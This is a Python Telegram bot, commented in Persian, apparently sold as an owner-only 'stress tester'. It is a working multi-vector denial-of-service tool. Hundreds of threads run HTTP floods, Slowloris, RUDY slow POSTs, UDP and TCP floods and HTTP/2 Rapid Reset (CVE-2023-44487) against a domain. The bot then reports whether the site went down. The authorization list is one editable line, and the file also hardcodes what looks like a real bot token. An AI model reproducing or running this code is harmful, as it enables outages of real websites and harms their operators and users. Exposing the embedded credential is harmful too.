#!/usr/bin/env python3
"""
APEX TELEGRAM STRESS BOT v3 — Owner-Only + Multi-Vector Engine
فقط دامنه‌های داخل AUTHORIZED_TARGETS قابل تست هستند
"""

import telebot
import threading
import time
import random
import statistics
import socket
import requests
from urllib.parse import urlparse

# ================= تنظیمات اصلی =================
BOT_TOKEN = "8994200473:AAHagUsqlEr39eb78DEQ1VYpQAwvgDHqV2g"
OWNER_ID = 8536789126   # آیدی عددی خودت (از @userinfobot بگیر)

AUTHORIZED_TARGETS = {
    "emad1401.ir",
    "nikogem.com",
}

DURATION = 120          # ثانیه
TIMEOUT = 5

bot = telebot.TeleBot(BOT_TOKEN)

# ================= آمار =================
lock = threading.Lock()
stats = {}
stop_time = 0
attack_running = False

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) Safari/604.1",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
]

# ============================================================
#                موتور بردارهای حمله
# ============================================================

# ---------- 1. HTTP FLOOD با cache-bypass ----------
def http_flood(host, port, path, use_ssl):
    import ssl as ssl_mod
    while time.time() < stop_time:
        try:
            s = socket.create_connection((host, port), timeout=TIMEOUT)
            if use_ssl:
                s = ssl_mod.create_default_context().wrap_socket(s, server_hostname=host)
            req = (
                f"GET {path}?cb={random.randint(0,10**12)} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                f"Accept: */*\r\n"
                f"Connection: keep-alive\r\n\r\n"
            ).encode()
            s.send(req)
            s.recv(512)
            s.close()
            with lock: stats["http_ok"] = stats.get("http_ok", 0) + 1
        except Exception:
            with lock: stats["http_err"] = stats.get("http_err", 0) + 1

# ---------- 2. SLOWLORIS ----------
def slowloris(host, port, use_ssl):
    import ssl as ssl_mod
    sockets = []
    while time.time() < stop_time:
        try:
            while len(sockets) < 150 and time.time() < stop_time:
                try:
                    s = socket.create_connection((host, port), timeout=TIMEOUT)
                    if use_ssl:
                        s = ssl_mod.create_default_context().wrap_socket(s, server_hostname=host)
                    s.send(f"GET /?{random.randint(0,10**9)} HTTP/1.1\r\n".encode())
                    s.send(f"Host: {host}\r\n".encode())
                    sockets.append(s)
                    with lock: stats["slow"] = stats.get("slow", 0) + 1
                except Exception:
                    break
            for s in sockets[:]:
                try:
                    s.send(f"X-a: {random.randint(0,5000)}\r\n".encode())
                except Exception:
                    sockets.remove(s)
            time.sleep(8)
        except Exception:
            pass

# ---------- 3. RUDY (Slow POST) ----------
def rudy(host, port, use_ssl):
    import ssl as ssl_mod
    while time.time() < stop_time:
        try:
            s = socket.create_connection((host, port), timeout=10)
            if use_ssl:
                s = ssl_mod.create_default_context().wrap_socket(s, server_hostname=host)
            s.send(
                f"POST /upload HTTP/1.1\r\nHost: {host}\r\n"
                f"Content-Length: 10000000\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n\r\n".encode()
            )
            while time.time() < stop_time:
                s.send(b"x=1")
                time.sleep(1)
        except Exception:
            time.sleep(1)

# ---------- 4. UDP FLOOD ----------
def udp_flood(host, port):
    payload = random.randbytes(1400)
    while time.time() < stop_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(payload, (host, port))
            s.close()
            with lock: stats["udp"] = stats.get("udp", 0) + 1
        except Exception:
            pass

# ---------- 5. TCP CONNECTION FLOOD ----------
def tcp_flood(host, port):
    while time.time() < stop_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(TIMEOUT)
            s.connect((host, port))
            s.send(random.randbytes(1024))
            s.close()
            with lock: stats["tcp"] = stats.get("tcp", 0) + 1
        except Exception:
            pass

# ---------- 6. HTTP/2 RAPID RESET (CVE-2023-44487) ----------
def h2_reset(host, port):
    try:
        import h2.connection, h2.config, ssl as ssl_mod
    except ImportError:
        return
    while time.time() < stop_time:
        try:
            s = socket.create_connection((host, port), timeout=10)
            ctx = ssl_mod.create_default_context()
            ctx.set_alpn_protocols(['h2'])
            s = ctx.wrap_socket(s, server_hostname=host)
            conn = h2.connection.H2Connection(config=h2.config.H2Configuration(client_side=True))
            conn.initiate_connection()
            s.sendall(conn.data_to_send())
            sid = 1
            while time.time() < stop_time:
                conn.send_headers(sid, [(':method','GET'),(':path','/'),
                                        (':authority',host),(':scheme','https')], end_stream=True)
                conn.reset_stream(sid, 0x8)
                s.sendall(conn.data_to_send())
                sid += 2
                with lock: stats["h2"] = stats.get("h2", 0) + 1
            s.close()
        except Exception:
            time.sleep(1)

# ---------- هماهنگ‌کننده ----------
def launch_attack(url):
    global stop_time
    u = urlparse(url)
    host = u.hostname
    port = u.port or (443 if u.scheme == "https" else 80)
    use_ssl = u.scheme == "https"
    path = u.path or "/"

    stop_time = time.time() + DURATION
    threads = []

    for _ in range(150):
        threads.append(threading.Thread(target=http_flood, args=(host, port, path, use_ssl), daemon=True))
    for _ in range(30):
        threads.append(threading.Thread(target=slowloris, args=(host, port, use_ssl), daemon=True))
    for _ in range(20):
        threads.append(threading.Thread(target=rudy, args=(host, port, use_ssl), daemon=True))
    for _ in range(50):
        threads.append(threading.Thread(target=udp_flood, args=(host, port), daemon=True))
    for _ in range(50):
        threads.append(threading.Thread(target=tcp_flood, args=(host, port), daemon=True))
    threads.append(threading.Thread(target=h2_reset, args=(host, port), daemon=True))

    for t in threads: t.start()
    for t in threads: t.join()

# ============================================================
#                بررسی سلامت سایت
# ============================================================
def health_check(url, rounds=3):
    results = []
    for _ in range(rounds):
        try:
            r = requests.get(url, timeout=10, headers={"User-Agent": random.choice(USER_AGENTS)})
            results.append((r.status_code, r.elapsed.total_seconds()))
        except Exception:
            results.append((0, 10.0))
        time.sleep(1)
    ok = sum(1 for s, _ in results if 200 <= s < 400)
    avg = statistics.mean(t for _, t in results)
    return {"up": ok, "avg": avg, "rounds": rounds}

# ============================================================
#                دستورات ربات
# ============================================================
def is_owner(m):
    return m.from_user.id == OWNER_ID

@bot.message_handler(commands=["start", "help"])
def start(m):
    if not is_owner(m): return
    bot.reply_to(m,
        "⚡ APEX Stress Bot v3 ⚡\n"
        "مالک: شما (فقط شما)\n\n"
        "/status <domain> — وضعیت سایت\n"
        "/attack <domain> — حمله همه‌برداری\n"
        "/stop — توقف اضطراری\n\n"
        f"دامنه‌های مجاز: {AUTHORIZED_TARGETS}")

@bot.message_handler(commands=["status"])
def status_cmd(m):
    if not is_owner(m): return
    parts = m.text.split()
    if len(parts) < 2:
        return bot.reply_to(m, "استفاده: /status example.com")
    domain = parts[1].lower().replace("https://","").replace("http://","").strip("/")
    if domain not in AUTHORIZED_TARGETS:
        return bot.reply_to(m, f"⛔ دامنه مجاز نیست\nمجاز: {AUTHORIZED_TARGETS}")
    r = health_check(f"https://{domain}")
    bot.reply_to(m, f"📊 {domain}\nUptime: {r['up']}/{r['rounds']}\nAvg: {r['avg']:.2f}s")

@bot.message_handler(commands=["attack"])
def attack_cmd(m):
    global attack_running, stats
    if not is_owner(m): return
    if attack_running:
        return bot.reply_to(m, "⚠️ حمله در حال اجراست. اول /stop")

    parts = m.text.split()
    if len(parts) < 2:
        return bot.reply_to(m, "استفاده: /attack example.com")
    domain = parts[1].lower().replace("https://","").replace("http://","").strip("/")
    if domain not in AUTHORIZED_TARGETS:
        return bot.reply_to(m, f"⛔ دامنه مجاز نیست\nمجاز: {AUTHORIZED_TARGETS}")

    url = f"https://{domain}"
    msg = bot.reply_to(m, "🔍 بررسی قبل از حمله...")
    before = health_check(url)
    bot.edit_message_text(
        f"📊 قبل: {before['up']}/{before['rounds']} up | {before['avg']:.2f}s\n\n"
        f"⚡ حمله همه‌برداری شروع شد ({DURATION}s)\n"
        f"HTTP+Slowloris+RUDY+UDP+TCP+H2RapidReset", msg.chat.id, msg.message_id)

    stats = {}
    attack_running = True
    try:
        launch_attack(url)
    finally:
        attack_running = False

    after = health_check(url)

    total = sum(v for k, v in stats.items())
    if after["up"] == 0:
        verdict = "🔴 سایت کاملاً DOWN شد — حمله موفق"
    elif after["up"] < before["up"]:
        verdict = "🟠 سایت نیمه‌مختل شد — حمله تا حدی موفق"
    elif after["avg"] > before["avg"] * 2:
        verdict = "🟡 کندی شدید — سرور زیر فشار"
    elif stats.get("http_err", 0) > total * 0.3 and total > 0:
        verdict = "🟡 نرخ خطای بالا — نشانه فشار"
    else:
        verdict = "🟢 سایت مقاوم بود — آسیب جدی ندید"

    detail = "\n".join(f"  • {k}: {v}" for k, v in stats.items())
    bot.send_message(m.chat.id,
        f"📊 گزارش نهایی {domain}\n\n"
        f"کل عملیات: {total}\n{detail}\n\n"
        f"قبل: {before['up']}/{before['rounds']} up | {before['avg']:.2f}s\n"
        f"بعد: {after['up']}/{after['rounds']} up | {after['avg']:.2f}s\n\n"
        f"{verdict}")

@bot.message_handler(commands=["stop"])
def stop_cmd(m):
    global stop_time, attack_running
    if not is_owner(m): return
    stop_time = 0
    attack_running = False
    bot.reply_to(m, "🛑 متوقف شد")

print("Bot running...")
bot.infinity_polling()